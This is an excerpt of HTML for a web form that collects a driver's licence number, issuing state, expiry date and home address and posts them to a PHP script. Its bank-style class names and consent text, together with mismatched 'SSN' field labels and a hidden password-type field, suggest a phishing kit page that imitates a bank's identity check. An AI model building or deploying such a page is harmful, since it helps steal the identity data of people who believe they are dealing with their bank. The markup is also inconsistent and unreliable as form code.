...
<form action="php/Next.php"  method="post"><div class="reqInd" aria-hidden="true" style="display: none;"></div><fieldset><div class="account-title clearfix">
...
<label class="control-label" for="SSN">Number<span class="required" aria-hidden="true">*</span></label>
<input style="padding-left: 8px;" class="form-control" id="dl" name="dl" class="required ALPHA_SPECIAL valid" type="text" value=""   data-validation="length" data-validation-error-msg="Required!" data-validation-length="min1" >
...
<div class="col-md-2"></div><div class="col-md-4"><div class="form-group has-feedback"><label class="control-label" for="SSN-CNFRM">State issued<span class="required" aria-hidden="true">*</span></label>
...
<label class="control-label" for="SSN" style="margin-top:14px;">Expiration date<span class="required" aria-hidden="true">*</span></label>
<input style="padding-left: 8px;" class="form-control" id="dlexp" name="dlexp" class="required DATE" type="tel" value="" placeholder="__/__/____" size="10"  data-validation="length" data-validation-error-msg="Expiration date is required!" data-validation-length="min10" >
...
<br><legend style="
    ...
    /* padding: 0; */
    font-weight: 400;
">Contact information</legend><br><div class="row"><div class="col-md-4"><div class="form-group has-feedback"><label class="control-label" for="SSN">Street address<span class="required" aria-hidden="true">*</span></label>
...
<span aria-hidden="true" class="glyphicon glyphicon-remove form-control-feedback" style="display: none;"></span><span class="error-block" aria-hidden="true" id="SSN-error" style="display: none;"></span></div></div><div class="col-md-2"></div><div class="col-md-4"><div class="form-group has-feedback"><label class="control-label" for="SSN-CNFRM">Suite/apt/other<span class="required" aria-hidden="true"> (optional)</span></label><input class="form-control" type="password" id="SSN-CNFRM" autocomplete="off" maxlength="9" aria-required="true" role="textbox"><span aria-hidden="true" class="glyphicon glyphicon-remove form-control-feedback" style="display: none;"></span><span class="error-block" aria-hidden="true" id="SSN-CNFRM-error" style="display: none;"></span></div></div><div class="col-md-2"></div></div>

<div class="row"><div class="col-md-4"><div class="form-group has-feedback"><label class="control-label" for="SSN">City<span class="required" aria-hidden="true">*</span></label>

<input style="padding-left: 8px;" class="form-control" id="d" name="city" class="required ALPHA_NUMERIC_SPECIAL" type="text" value="" placeholder=" " size="24"  data-validation="length" data-validation-error-msg="City is required!" data-validation-length="min2-20" >


<span aria-hidden="true" class="glyphicon glyphicon-remove form-control-feedback" style="display: none;"></span><span class="error-block" aria-hidden="true" id="SSN-error" style="display: none;"></span></div></div><div class="col-md-2"></div><div class="col-md-4"><div class="form-group has-feedback"><label class="control-label" for="SSN-CNFRM">ZIP code<span class="required" aria-hidden="true">*</span></label>

<input style="padding-left: 8px;" class="form-control" id="d" name="zipcode" class="required NUMERIC" type="tel" value="" placeholder=" " size="8"  data-validation="length" data-validation-error-msg="ZIP code is required!" data-validation-length="2-5" >

<span aria-hidden="true" class="glyphicon glyphicon-remove form-control-feedback" style="display: none;"></span><span class="error-block" aria-hidden="true" id="SSN-CNFRM-error" style="display: none;"></span></div></div><div class="col-md-2"></div></div><div class="jpui fieldhelpertext" id="maskedSocialSecurityNumber-text-validate-helpertext">When you give us your mobile number, we have your consent to send you automated calls and texts to service all of your accounts with us.  </div></fieldset><br><div class="btn-group buttonContainerSpacing">
